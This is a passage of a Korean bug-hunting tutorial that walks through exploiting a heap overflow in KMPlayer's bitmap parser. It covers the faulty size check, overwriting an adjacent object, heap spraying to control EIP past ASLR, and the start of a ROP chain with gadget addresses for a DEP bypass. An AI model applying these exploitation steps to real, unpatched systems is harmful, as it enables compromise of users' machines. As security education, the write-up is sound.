<code>0x1f28</code> &#xC774;&#xACA0;&#xC8E0;? &#xADF8;&#xB7F0; &#xB2E4;&#xC74C; <code>0x1f28+0x40c</code> &#xB9CC;&#xD07C; <code>BITMAPINFOHEADER</code> &#xB97C; &#xC800;&#xC7A5;&#xD558;&#xAE30; &#xC704;&#xD55C; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xD560;&#xB2F9;&#xD574;&#xC8FC;&#xACE0; &#xD574;&#xB2F9; &#xC8FC;&#xC18C;&#xB97C; header&#xC5D0; &#xC800;&#xC7A5;&#xD574;&#xC90D;&#xB2C8;&#xB2E4;. &#xADF8;&#xB9AC;&#xACE0; <code>size</code> &#xC640; <code>0xc</code> &#xAC00; &#xAC19;&#xC740; &#xC9C0; &#xBE44;&#xAD50;&#xB97C; &#xD574;&#xC11C; &#xACB0;&#xACFC; &#xAC12;&#xC744; <code>size_bool</code> &#xC5D0; &#xC800;&#xC7A5;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB54C; <code>size</code> &#xB294; <code>0x1f28</code> &#xC774;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; <code>size_bool</code>&#xC5D0;&#xB294; 0 &#xC774; &#xC800;&#xC7A5;&#xB429;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; &#xBC11;&#xC5D0; &#xBD84;&#xAE30;&#xC810;&#xC5D0;&#xC11C; <code>size_bool</code> &#xC774; <code>0</code> &#xC774;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; <code>else</code>&#xB85C; &#xBE60;&#xC9C0;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/03/31/l0ch/bughunting-tutorials-part4/image--052.png" alt="bughunting-tutorials-part4/image--052.png"></p><p><code>else</code>&#xB85C; &#xBE60;&#xC9C0;&#xAC8C; &#xB418;&#xBA74; &#xD30C;&#xC77C;&#xC758; <code>BITMAPINFOHEADER</code> &#xC2DC;&#xC791; &#xBD80;&#xBD84;&#xBD80;&#xD130; <code>size</code>&#xB9CC;&#xD07C; &#xC77D;&#xC5B4;&#xC640;&#xC11C; header&#xC5D0; &#xC800;&#xC7A5;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;. &#xC55E;&#xC5D0;&#xC11C; <code>size+0x40c</code> &#xB9CC;&#xD07C; &#xD560;&#xB2F9;&#xC744; &#xD588;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC624;&#xBC84;&#xD50C;&#xB85C;&#xC6B0;&#xAC00; &#xBC1C;&#xC0DD;&#xD560; &#xC218; &#xC5C6;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p>&#xADF8;&#xB7F0; &#xB2E4;&#xC74C;, compression&#xC5D0; &#xB300;&#xD55C; &#xBD84;&#xAE30;&#xBB38;&#xC744; &#xB9CC;&#xB098;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;. &#xC774; &#xAC12;&#xC740; <code>0x00</code> &#xC5D0;&#xC11C; <code>0xa00</code>&#xC73C;&#xB85C; &#xC218;&#xC815;&#xD588;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xD574;&#xB2F9; &#xBD84;&#xAE30;&#xB85C; &#xB4E4;&#xC5B4;&#xAC08; &#xC218; &#xC788;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;. &#xBD84;&#xAE30;&#xB85C; &#xB4E4;&#xC5B4;&#xAC00;&#xBA74; &#xCCAB; &#xBC88;&#xC9F8;&#xB85C; &#xD558;&#xB294; &#xC77C;&#xC774; &#xC624;&#xBE0C;&#xC81D;&#xD2B8;&#xB97C; &#xD560;&#xB2F9;&#xD558;&#xB124;&#xC694;. &#xADF8;&#xB7FC; <code>BITMAPINFOHEADER</code> &#xAC00; &#xD560;&#xB2F9;&#xB41C; &#xB4B7;&#xBD80;&#xBD84;&#xC5D0; &#xD560;&#xB2F9;&#xC774; &#xB418;&#xACA0;&#xB124;&#xC694;.(<code>BITMAPINFOHEADER</code> &#xAC00; &#xD398;&#xC774;&#xC9C0;&#xB97C; &#xD558;&#xB098; &#xB354; &#xD560;&#xB2F9;&#xD560; &#xB9CC;&#xD07C; &#xD06C;&#xC9C8; &#xC54A;&#xC73C;&#xB2C8;) &#xC774; &#xBD80;&#xBD84;&#xC774; &#xC911;&#xC694;&#xD569;&#xB2C8;&#xB2E4;!!! &#xC65C;&#xB0D0;&#xD558;&#xBA74; &#xC6B0;&#xB9AC;&#xAC00; &#xB36E;&#xAC8C; &#xB420; &#xAC1D;&#xCCB4;&#xB2C8;&#xAE4C;&#xC694; &#x314E;&#x314E;(&#xC751;? <code>BITMAPINFOHEADER</code>&#xB4A4;&#xC5D0; &#xD560;&#xB2F9;&#xB41C;&#xB2E4;&#xBA70;&#x2026; &#xC624;&#xBC84;&#xD50C;&#xB85C;&#xC6B0; &#xC548; &#xB09C;&#xB2E4;&#xBA70;&#x2026;.)</p><p>&#xB4A4;&#xC5D0; &#xB354; &#xBCF4;&#xB3C4;&#xB85D; &#xD558;&#xC8E0; &#x314E;&#x314E;&#x314E;&#x314E;</p><p><img src="/2021/03/31/l0ch/bughunting-tutorials-part4/image--054.jpg" alt="bughunting-tutorials-part4/image--054.jpg"></p><p>&#xC774;&#xC81C;&#xB294; <code>this</code> &#xC5D0; <code>BITMAPINFOHEADER</code> &#xC815;&#xBCF4;&#xB97C; &#xC800;&#xC7A5;&#xD569;&#xB2C8;&#xB2E4;. &#xCC38; &#xCC30;&#xC9C0;&#xAC8C; &#xB2E4; &#xB123;&#xB124;&#xC694;.<br>&#xADF8;&#xB9AC;&#xACE0; &#xB9C8;&#xC9C0;&#xB9C9;&#xC5D0;&#xB294; &#xBAA8;&#xB4E0; &#xBE44;&#xD2B8;&#xB9F5; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC800;&#xC7A5;&#xD569;&#xB2C8;&#xB2E4;. &#xC6B0;&#xB9AC;&#xB294; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787;&#xC744; &#xD560; &#xB54C; &#xC774; &#xBD80;&#xBD84;&#xC744; &#xC774;&#xC6A9;&#xD574;&#xC11C; &#xC2A4;&#xD504;&#xB808;&#xC774;&#xB97C; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4; &#x314E;&#x314E;</p><p><img src="/2021/03/31/l0ch/bughunting-tutorials-part4/image--056.jpg" alt="bughunting-tutorials-part4/image--056.jpg"></p><p>&#xC774;&#xC81C; &#xCDE8;&#xC57D;&#xC810; &#xBD80;&#xBD84;&#xC785;&#xB2C8;&#xB2E4; &#x314E;&#x314E;&#x314E; &#xB4DC;&#xB514;&#xC5B4; &#x314E;&#x314E;</p><p>&#xBA3C;&#xC800; &#xC5B4;&#xB5A4; &#xC8FC;&#xC18C;&#xB97C; &#xACC4;&#xC0B0;&#xD569;&#xB2C8;&#xB2E4;. Header &#xC8FC;&#xC18C; &#xAE30;&#xC900;&#xC73C;&#xB85C; <code>size</code> &#xB9CC;&#xD07C; &#xB4A4;&#xC5D0; &#xC8FC;&#xC18C;&#xB97C; &#xC800;&#xC7A5;&#xD569;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7F0; &#xB2E4;&#xC74C; &#xBC11;&#xC5D0; &#xBAA8;&#xB4E0; &#xBD84;&#xAE30;&#xB97C; &#xAC74;&#xB108;&#xB6F0;&#xACE0; <code>sub_41AAF0</code> &#xD568;&#xC218;&#xB85C; &#xAC11;&#xB2C8;&#xB2E4;. &#xC774; &#xD568;&#xC218;&#xB294; &#xD30C;&#xC77C; &#xC2A4;&#xD2B8;&#xB9BC;&#xC5D0;&#xC11C; <code>byte_4BA6F4[size_bool] * header-&gt;biClrUsed = 0x800</code> &#xB9CC;&#xD07C; &#xC77D;&#xC5B4;&#xC11C; &#xC704;&#xC5D0;&#xC11C; &#xACC4;&#xC0B0;&#xD55C; &#xC8FC;&#xC18C;&#xC5D0; &#xC800;&#xC7A5;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC5EC;&#xAE30;&#xC5D0;&#xC11C; &#xC624;&#xBC84;&#xD50C;&#xB85C;&#xC6B0;&#xAC00; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;!!!! &#xC544;&#xAE4C; &#xC704;&#xC5D0;&#xC11C; &#xC598;&#xAE30;&#xD588;&#xB4EF;&#xC774; header &#xC758; &#xD06C;&#xAE30;&#xB294; <code>size+0x40c</code>&#xC785;&#xB2C8;&#xB2E4; &#x314B;&#x314B;&#x314B; &#xADFC;&#xB370; &#xC5EC;&#xAE30;&#xC5D0;&#xC11C;&#xB294; <code>header+size</code> &#xC5D0; <code>0x800</code> &#xBC14;&#xC774;&#xD2B8;&#xB97C; &#xD560;&#xB2F9;&#xD558;&#xB2C8; &#xB4A4;&#xC5D0; &#xC788;&#xB294; &#xAC1D;&#xCCB4;&#xB97C; &#xB36E;&#xAC8C; &#xB418;&#xB294; &#xAC70;&#xC8E0;!! &#xADF8;&#xB7FC; &#xAC1D;&#xCCB4;&#xAC00; &#xB36E;&#xC774;&#xAE30; &#xC804;&#xACFC; &#xD6C4;&#xB97C; &#xD55C;&#xBC88; &#xC0B4;&#xD3B4;&#xBCFC;&#xAC8C;&#xC694;!!</p><p>Before:</p><p><img src="/2021/03/31/l0ch/bughunting-tutorials-part4/image--058.png" alt="bughunting-tutorials-part4/image--058.png"></p><p>After:</p><p><img src="/2021/03/31/l0ch/bughunting-tutorials-part4/image--060.png" alt="bughunting-tutorials-part4/image--060.png"></p><p>&#xD5E4;&#xD5FF; &#xC790; &#xC774;&#xC81C; &#xADF8;&#xB7FC; <code>eip</code>&#xB97C; &#xC7A1;&#xC744; &#xC218; &#xC788;&#xACA0;&#xB124;&#xC694;!!!</p><p><img src="/2021/03/31/l0ch/bughunting-tutorials-part4/image--062.png" alt="bughunting-tutorials-part4/image--062.png"></p><p>&#xB124;&#x2026;.? &#xBB58; &#xC7A1;&#xB294;&#xB2E4;&#xB294; &#xAC70;&#xC8E0;&#x2026;.? &#xC96C;&#xB975;&#x2026;. &#x3160;&#x3160; &#xD6C4;&#xC6B0; &#xC5ED;&#xC2DC; &#xC778;&#xC0DD;&#xC740; &#xD5D8;&#xB09C;&#xD558;&#xB124;&#xC694;&#x2026;</p><p>&#xC73C;&#xC74C;&#x2026; &#xC774;&#xC81C; &#xB514;&#xBC84;&#xAE45;&#xD574;&#xBCF4;&#xBA74;&#xC11C; &#xD558;&#xB098;&#xD558;&#xB098; &#xD574;&#xACB0;&#xD574; &#xB098;&#xAC08;&#xAC8C;&#xC694; &#x3160;&#x3160;<br>&#xBA3C;&#xC800; <code>0x11111111</code> &#xC5D0; Access violation&#xC774; &#xBC1C;&#xC0DD;&#xD558;&#xB294; &#xAC83;&#xC740; &#xC6B0;&#xB9AC;&#xAC00; &#xB123;&#xC740; &#xB370;&#xC774;&#xD130;&#xAC00; &#xC720;&#xD6A8;&#xD55C; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xAC00;&#xB9AC;&#xD0A4;&#xAC8C; &#xD558;&#xBA74; &#xB418;&#xACA0;&#xC8E0;!! &#xD558;&#xC9C0;&#xB9CC;!!! ASLR&#xC774; &#xAC78;&#xB824;&#xC788;&#xC5B4;&#xC11C; &#xADF8;&#xB807;&#xAC8C; &#xD558;&#xB294; &#xAC8C; &#xC27D;&#xC9C0; &#xC54A;&#xB2E4;&#xB294; &#xAC70;&#x2026;. &#xADF8;&#xB807;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC2A4;&#xD504;&#xB808;&#xC774;&#xB97C; &#xC9C4;&#xD589;&#xD574;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. &#xB2E4;&#xD589;&#xD788;(??) KMPlayer&#xC640; ImLoader&#xAC00; 32 &#xBE44;&#xD2B8;&#xB85C; &#xCEF4;&#xD30C;&#xC77C;&#xB418;&#xC5B4; &#xC788;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC2A4;&#xD504;&#xB808;&#xC774;&#xB97C; &#xD558;&#xBA74; &#xC5B4;&#xB290; &#xC815;&#xB3C4; &#xB9B4;&#xB77C;&#xC774;&#xC5B4;&#xBE14;&#xD558;&#xAC8C; &#xC6D0;&#xD558;&#xB294; &#xC8FC;&#xC18C;&#xC5D0; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xB9E4;&#xD551;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD560;&#xB2F9;&#xD558;&#xB294; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0; &#xD06C;&#xAE30;&#xC5D0; &#xB530;&#xB77C;&#xC11C; &#xC790;&#xC8FC; &#xB9E4;&#xD551;&#xB418;&#xB294; &#xC8FC;&#xC18C;&#xAC00; &#xB2EC;&#xB77C;&#xC9D1;&#xB2C8;&#xB2E4;. &#xC800;&#xB294; &#xC5EC;&#xAE30;&#xC5D0;&#xC11C; 150M &#xC815;&#xB3C4;&#xB97C; 0x11&#xB85C; &#xC2A4;&#xD504;&#xB808;&#xC774; &#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p>150M&#xB85C; &#xC2A4;&#xD504;&#xB808;&#xC774;&#xD55C; &#xC774;&#xC720;&#xB294; &#xB514;&#xBC84;&#xAE45;&#xD560; &#xB54C; &#xC774; &#xC815;&#xB3C4; &#xD06C;&#xAE30;&#xAC00; &#xAC00;&#xC7A5; &#xC801;&#xB2F9;&#xD55C; &#xC18D;&#xB3C4;&#xAC00; &#xB098;&#xC640;&#xC11C; &#xC778;&#xB370;&#xC694;. &#xB514;&#xBC84;&#xAE45;&#xD560; &#xB54C; <code>0x11111111</code> &#xC5D0; &#xB9E4;&#xD551;&#xC774; &#xC548;&#xB418;&#xBA74; &#xB2E4;&#xC2DC; &#xC2DC;&#xC791;&#xD574;&#xC11C; &#xD14C;&#xC2A4;&#xD2B8;&#xB97C; &#xD574;&#xC57C; &#xB418;&#xC796;&#xC544;&#xC694;? &#xD06C;&#xAE30;&#xAC00; &#xCEE4;&#xC9C0;&#xBA74; &#xC6D0;&#xD558;&#xB294; &#xC8FC;&#xC18C;&#xC5D0; &#xB9E4;&#xD551;&#xC774; &#xB354; &#xC798;&#xB418;&#xC9C0;&#xB9CC; &#xC708;&#xB3C4;&#xC6B0;&#xAC00; &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xB97C; &#xD558;&#xBA74; &#xD560;&#xC218;&#xB85D; &#xB79C;&#xB364; &#xB9C8;&#xC774;&#xC9D5;&#xC774; &#xC798;&#xB3FC;&#xC11C; &#xD06C;&#xAE30;&#xAC00; &#xCEE4;&#xB3C4; &#xC798; &#xC548;&#xB418;&#xB354;&#xB77C;&#xACE0;&#xC694; &#x3160;&#x3160;(&#xC608;&#xC804;&#xC5D0;&#xB294; 300M &#xB9CC; &#xD574;&#xB3C4; &#xAC70;&#xC758; &#xACE0;&#xC815;&#xC774;&#xB77C;&#xACE0; &#xB4E4;&#xC5C8;&#xB294;&#xB370;&#x2026;) &#xAC00;&#xC7A5; &#xD6A8;&#xC728;&#xC801;&#xC774;&#xB77C;&#xACE0; &#xC0DD;&#xAC01;&#xD558;&#xB294; &#xD06C;&#xAE30;&#xB85C; &#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB9CC;&#xC57D; &#xC6D0;&#xD558;&#xB294; &#xB370;&#xB85C; &#xC798; &#xB41C;&#xB2E4;&#xBA74; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; &#xD574;&#xB2F9; &#xC8FC;&#xC18C;&#xC5D0; &#xC798; &#xB9E4;&#xD551;&#xB41C; &#xAC83;&#xC744; &#xBCFC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;!!</p><p><img src="/2021/03/31/l0ch/bughunting-tutorials-part4/image--064.png" alt="bughunting-tutorials-part4/image--064.png"></p><p>&#xADF8;&#xB9AC;&#xACE0; &#xC774;&#xB300;&#xB85C; &#xC2E4;&#xD589;&#xD558;&#xBA74;!!!</p><p><img src="/2021/03/31/l0ch/bughunting-tutorials-part4/image--066.png" alt="bughunting-tutorials-part4/image--066.png"></p><p>&#xC9DD;&#xC9DD;&#xC9DD;!! <code>eip</code>&#xB97C; &#xC7A1;&#xC558;&#xC2B5;&#xB2C8;&#xB2E4;!!! &#xC18C;&#xB9AC;&#xC9C8;&#xB7EC;&#xC5B4;&#xC5B4;&#xC5B4;&#xC5B4;&#xC5B4;&#xC5B4;!!!! (&#xD558;&#x2026; &#xD5D8;&#xB09C;&#xD588;&#xB2E4;&#x2026;) &#xC774;&#xC81C; &#xC775;&#xC2A4;&#xB9CC; &#xD558;&#xBA74; &#xB418;&#xACA0;&#xB124;&#xC694; &#x314E;&#x314E;&#x314E;</p><hr><p>&#xC77C;&#xB2E8; &#xC5B4;&#xB5BB;&#xAC8C; <code>eip</code>&#xB97C; &#xC7A1;&#xAC8C; &#xB418;&#xC5C8;&#xB294;&#xC9C0; &#xD568; &#xBCFC;&#xAC8C;&#xC694;. &#xC77C;&#xB2E8; &#xC2A4;&#xD0DD;&#xC5D0; &#xC788;&#xB294; &#xB9AC;&#xD134; &#xC5B4;&#xB4DC;&#xB808;&#xC2A4;&#xB97C; &#xD655;&#xC778;&#xD574;&#xC11C; &#xC5B4;&#xB514;&#xC5D0;&#xC11C; <code>call</code> &#xD639;&#xC740; <code>jmp</code>&#xB97C; &#xD588;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD574;&#xBCFC;&#xAC8C;&#xC694;.</p><p><img src="/2021/03/31/l0ch/bughunting-tutorials-part4/image--068.png" alt="bughunting-tutorials-part4/image--068.png"></p><p><img src="/2021/03/31/l0ch/bughunting-tutorials-part4/image--070.png" alt="bughunting-tutorials-part4/image--070.png"></p><p>&#xC2A4;&#xD0DD;&#xC5D0; &#xC788;&#xB294; &#xB9C8;&#xC9C0;&#xB9C9; &#xB9AC;&#xD134; &#xC5B4;&#xB4DC;&#xB808;&#xC2A4;&#xB97C; &#xBCF4;&#xB2C8; <code>ImLoader+0x357f</code> &#xC778; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xACE0; &#xC774; &#xC8FC;&#xC18C;&#xBCF4;&#xB2E4; &#xC704;&#xC5D0; &#xC788;&#xB294; instruction&#xC744; &#xD655;&#xC778;&#xD574;&#xBCF4;&#xBA74; <code>call dword ptr [ecx-4]</code>&#xC778; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB9AC;&#xACE0; <code>ecx</code>&#xB294; <code>eax</code>&#xAC00; &#xAC00;&#xB9AC;&#xD0A4;&#xB294; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0;&#xC11C; &#xAC00;&#xC838;&#xC628; &#xAC83;&#xC774;&#xB124;&#xC694;.</p><p><img src="/2021/03/31/l0ch/bughunting-tutorials-part4/image--072.png" alt="bughunting-tutorials-part4/image--072.png"></p><p>&#xADF8;&#xB7FC; &#xC774;&#xC81C; &#xC911;&#xC694;&#xD55C; &#xAC70;&#xB294; <code>0x11111111</code> &#xC774; &#xAC00;&#xB9AC;&#xD0A4;&#xB294; &#xB370;&#xC774;&#xD130;&#xAC00; &#xD30C;&#xC77C;&#xC5D0;&#xC11C;&#xC758; &#xC624;&#xD504;&#xC14B;(&#xC704;&#xCE58;??)&#xC774; <code>eax</code>&#xAC00; &#xAC00;&#xB9AC;&#xD0A4;&#xB294; &#xB370;&#xC774;&#xD130;&#xC758; &#xC624;&#xD504;&#xC14B;&#xC774; &#xC77C;&#xCE58;&#xD558;&#xB0D0;&#xB294; &#xAC83;&#xC778;&#xB370;&#xC694;. &#xC774; &#xBD80;&#xBD84;&#xC744; &#xD655;&#xC778;&#xD574;&#xBCF4;&#xAE30; &#xC704;&#xD574;&#xC11C; &#xC77C;&#xB2E8; <code>0x11111111</code> &#xBD80;&#xBD84;&#xC774; &#xC5B4;&#xB5A4; &#xC704;&#xCE58;&#xC5D0; &#xC788;&#xB294;&#xC9C0; &#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/03/31/l0ch/bughunting-tutorials-part4/image--074.jpg" alt="bughunting-tutorials-part4/image--074.jpg"></p><p>&#xB9C8;&#xC9C0;&#xB9C9; &#xBA54;&#xBAA8;&#xB9AC;&#xAC00; &#xC804;&#xCCB4; &#xBE44;&#xD2B8;&#xB9F5; &#xC774;&#xBBF8;&#xC9C0;&#xB97C; &#xB2F4;&#xACE0; &#xC788;&#xB294; &#xBD80;&#xBD84;&#xC774;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xD574;&#xB2F9; &#xBA54;&#xBAA8;&#xB9AC; &#xAE30;&#xC900;&#xC73C;&#xB85C; &#xACC4;&#xC0B0;&#xD558;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;. <code>0x11111111 &#x2013; 0x101cb056 = 0xF460BB</code> &#xB124;&#xC694;. &#xC55E;&#xC5D0;&#xC11C; &#xAC1D;&#xCCB4;&#xB97C; &#xB36E;&#xC744; &#xB54C;&#xC5D0;&#xB294; &#xD30C;&#xC77C; &#xAE30;&#xC900;&#xC73C;&#xB85C; &#xC55E;&#xBD80;&#xBD84; &#xB370;&#xC774;&#xD130;&#xB97C; &#xAC00;&#xC838;&#xC640; &#xBCF5;&#xC0AC;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xB97C; &#xB2F4;&#xB294; &#xB370;&#xC5D0;&#xB294; &#xD070; &#xBB38;&#xC81C;&#xAC00; &#xC5C6;&#xC744; &#xAC83; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;!!</p><p>&#xC790; &#xC774;&#xC81C; &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xB97C; &#xC791;&#xC131;&#xD574;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xB97C; &#xC791;&#xC131;&#xD558;&#xAE30; &#xC804;&#xC5D0; MONA&#xC640; &#xBA54;&#xD0C0;&#xC2A4;&#xD50C;&#xB85C;&#xC787;&#xC744; &#xC0AC;&#xC6A9;&#xD574;&#xC11C; &#xBAA8;&#xB4C8;&#xB4E4;&#xC758; &#xBBF8;&#xD2F0;&#xAC8C;&#xC774;&#xC158; &#xC801;&#xC6A9; &#xD56D;&#xBAA9;, &#xD544;&#xC694;&#xD55C; &#xAC00;&#xC82F; &#xAC80;&#xC0C9;, &#xC258; &#xCF54;&#xB4DC; &#xC0DD;&#xC131;&#xC744; &#xD574;&#xC57C; &#xD558;&#xB294; &#xB370; &#xC774; &#xBD80;&#xBD84;&#xC740; &#xC778;&#xD130;&#xB137;&#xC744; &#xAC80;&#xC0C9;&#xD558;&#xBA74; &#xB9CE;&#xC774; &#xB098;&#xC624;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC0DD;&#xB7B5;&#xD558;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. &#xACB0;&#xB860;&#xC801;&#xC73C;&#xB85C; <code>KMPlayer.exe</code> &#xC5D0; Rebase&#xAC00; &#xC548; &#xAC78;&#xB824;&#xC788;&#xC5B4;&#xC11C; <code>KMPlayer.exe</code> &#xC5D0; &#xC788;&#xB294; &#xAC00;&#xC82F;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xB3C4;&#xB85D; &#xD560; &#xAC83;&#xC774;&#xACE0;&#xC694;, &#xBA54;&#xD0C0;&#xC2A4;&#xD50C;&#xB85C;&#xC787;&#xC744; &#xD1B5;&#xD574;&#xC11C;&#xB294; &#xACC4;&#xC0B0;&#xAE30;&#xB97C; &#xC2E4;&#xD589;&#xC2DC;&#xD0A4;&#xB294; &#xC258; &#xCF54;&#xB4DC;&#xB97C; &#xB9CC;&#xB4E4; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xC77C;&#xB2E8; ASLR&#xC740; &#xC2A4;&#xD504;&#xB808;&#xC774;&#xB85C; &#xC5B4;&#xB290; &#xC815;&#xB3C4; &#xCEE4;&#xBC84;&#xD558;&#xC600;&#xACE0; DEP&#xB9CC; &#xBB34;&#xB825;&#xD654;&#xC2DC;&#xD0A4;&#xACE0; &#xC258; &#xCF54;&#xB4DC;&#xB97C; &#xC791;&#xC131;&#xD558;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;. DEP&#xB97C; &#xBB34;&#xB825;&#xD654;&#xD558;&#xB824;&#xBA74; ROP&#xB97C; &#xD574;&#xC57C;&#xC8E0;!! &#xC774;&#xC81C; <code>esp</code>&#xB97C; &#xC6B0;&#xB9AC; &#xB370;&#xC774;&#xD130;&#xAC00; &#xC788;&#xB294; &#xD799; &#xBA54;&#xBAA8;&#xB9AC;&#xB85C; &#xD53C;&#xBD07; &#xC2DC;&#xD0AC; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;. &#xC74C; &#xC801;&#xB2F9;&#xD55C; &#xAC00;&#xC82F;&#xC744; &#xCC3E;&#xC544;&#xBCF4;&#xB3C4;&#xB85D; &#xD558;&#xC8E0;.</p><pre><code class="hljs c"><span class="hljs-number">0x00523702</span> : # PUSH ECX # POP ESP # POP ESI # POP EBX # RETN</code></pre><p>&#xC77C;&#xBD80;&#xB85C; &#xB450; &#xBC88; &#xB354; <code>POP</code> &#xD574;&#xC8FC;&#xB294; &#xC774;&#xC720;&#xB294; &#xC704;&#xC5D0; &#xBCF4;&#xC2DC;&#xB2E4;&#xC2DC;&#xD53C; <code>0x11111111</code> &#xBD80;&#xBD84;&#xC5D0; 8 &#xBC14;&#xC774;&#xD2B8;&#xAC00; &#xB2E4;&#xB978; &#xB370;&#xC774;&#xD130;&#xB85C; &#xB36E;&#xC5EC; &#xC788;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC774; 8 &#xBC14;&#xC774;&#xD2B8;&#xB97C; &#xB6F0;&#xC5B4;&#xB118;&#xACE0; &#xB9AC;&#xD134;&#xD558;&#xAE30; &#xC704;&#xD568;&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xC790; &#xADF8;&#xB7EC;&#xBA74; &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xB97C; &#xC791;&#xC131;&#xD560; &#xB54C; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; &#xD558;&#xBA74; &#xB418;&#xACA0;&#xB124;&#xC694;.</p><p>&#xC81C;&#xC77C; &#xCC98;&#xC74C; &#xBD80;&#xBD84;&#xC5D0;&#xB294; &#xC704; &#xAC00;&#xC82F;&#xC758; &#xC8FC;&#xC18C;&#xB97C; &#xC0AC;&#xC6A9;&#xD560; &#xAC81;&#xB2C8;&#xB2E4;. &#xADF8;&#xB9AC;&#xACE0; &#xBC14;&#xB85C; &#xADF8; &#xB4A4;&#xC5D0;&#xB294; &#xB610; &#xD53C;&#xBD07; &#xD558;&#xB294; &#xAC00;&#xC82F;&#xC744; &#xB123;&#xC5B4;&#xC904; &#xAC81;&#xB2C8;&#xB2E4;. &#xC774;&#xBC88;&#xC5D0;&#xB294; &#xADF8;&#xB0E5; &#xD799;&#xC5D0;&#xC11C;&#xB9CC;&#xC694;. &#xC65C;&#xB0D0;&#xD558;&#xBA74; &#xC774;&#xBC88;&#xC5D0;&#xB294; <code>0x101cb056</code> &#xC5D0; &#xB9E4;&#xD551;&#xC774; &#xB418;&#xC5C8;&#xC9C0;&#xB9CC; &#xB2E4;&#xC74C;&#xC5D0; &#xB610; &#xC774; &#xC5B8;&#xC800;&#xB9AC; &#xC8FC;&#xC18C;&#xC5D0; &#xB9E4;&#xD551;&#xB420; &#xB54C;&#xB3C4; &#xC774; &#xC8FC;&#xC18C;&#xB77C;&#xB294; &#xBCF4;&#xC7A5;&#xC774; &#xC5C6;&#xC73C;&#xB2C8;&#xAE50;&#xC694;. &#xCD5C;&#xC18C;&#xD55C; &#xD558;&#xC704; 2 &#xBC14;&#xC774;&#xD2B8;&#xB294; &#xBC14;&#xB00C;&#xACA0;&#xC8E0;. &#xADF8;&#xB807;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; <code>esp</code>&#xB97C; &#xC2A4;&#xD0DD;&#xC5D0;&#xC11C; &#xD799;&#xC73C;&#xB85C;, &#xB2E4;&#xC2DC; &#xD799;&#xC5D0;&#xC11C; &#xB2E4; &#xB192;&#xC740; &#xC8FC;&#xC18C;&#xC758; &#xD799;&#xC73C;&#xB85C; &#xD53C;&#xBD07; &#xD558;&#xB294; &#xAC00;&#xC82F; &#xB450; &#xAC1C;&#xB97C; &#xC2A4;&#xD504;&#xB808;&#xC774; &#xD574;&#xC904; &#xAC81;&#xB2C8;&#xB2E4;. &#xD799;&#xC5D0;&#xC11C; &#xD799;&#xC73C;&#xB85C; &#xD53C;&#xBD07; &#xD558;&#xB294; &#xAC00;&#xC82F;&#xC740; &#xC544;&#xB798; &#xAC78;&#xB85C; &#xC4F0;&#xB3C4;&#xB85D; &#xD560;&#xAC8C;&#xC694;.</p><pre><code class="hljs c"><span class="hljs-number">0x0095dffa</span> : # ADD ESP,<span class="hljs-number">19010</span> # POP EBP # POP EDI # POP ESI # POP EBX # RETN</code></pre><p>&#xADF8;&#xB9AC;&#xACE0; &#xC911;&#xAC04;&#xC911;&#xAC04;&#xC5D0; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC5D0;&#xC11C; &#xD799;&#xC744; &#xC4F0;&#xB2E4;&#xAC00; &#xBC14;&#xAFBC; 